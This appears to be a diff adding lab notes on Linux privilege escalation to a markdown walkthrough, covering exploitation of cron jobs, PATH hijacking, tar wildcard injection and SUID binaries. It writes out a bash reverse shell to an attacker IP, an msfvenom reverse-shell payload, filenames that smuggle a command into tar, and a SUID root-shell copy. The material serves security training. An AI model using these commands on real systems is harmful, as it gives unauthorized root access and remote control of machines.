@@ -165,8 +165,86 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 - A root shell should spawn. 
 - Errors: Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. 
 - Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.
-
-
+### Cron Jobs -File permissions
+- Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
+- Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.
+- View the contents of the system-wide crontab:
+````
+cat /etc/crontab
+````
+- There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
+- Locate the full path of the overwrite.sh file:
+````
+locate overwrite.sh
+````
+- Note that the file is world-writable:
+````
+ls -l /usr/local/bin/overwrite.sh
+````
+- Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
+````
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+````
+- Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.
+````
+nc -nvlp 4444
+````
+### Cron Jobs Path Environment Variable
+- View the contents of the system-wide crontab:
+````
+cat /etc/crontab
+````
+- Note that the PATH variable starts with /home/user which is our user's home directory.
+- Create a file called overwrite.sh in your home directory with the following contents:
+````
+#!/bin/bash
+ 
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+````
+- Make sure that the file is executable:
+````
+chmod +x /home/user/overwrite.sh
+````
+- Wait for the cron job to run. Run the `/tmp/rootbash` command with `-p` to gain a shell running with root privileges:
+````
+/tmp/rootbash -p
+````
+### CronJobs - Wildcards
+- View the contents of the other cron job script:
+````
+cat /usr/local/bin/compress.sh
+````
+- Note that the tar command is being run with a wildcard (*) in your home directory.
+- Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
+- Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
+````
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+````
+- Transfer the shell.elf file to /home/user/ on the Debian VM.
+````
+chmod +x /home/user/shell.elf
+````
+- Create these two files in /home/user:
+````
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+````
+- When the tar command in the cron job runs, the wildcard (*) will expand to include these files. 
+- Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+- Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.
+````
+nc -nvlp 4444
+````
+### SUID/SGID Executables --Known Exploits
+- Find all the SUID/SGID executables on the Debian VM:
+````
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+````
+- Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!
+- Exploit code for this is in this repo.
+- Check GTFO Bins and Google for SUID/SGID!!!
 
 
 
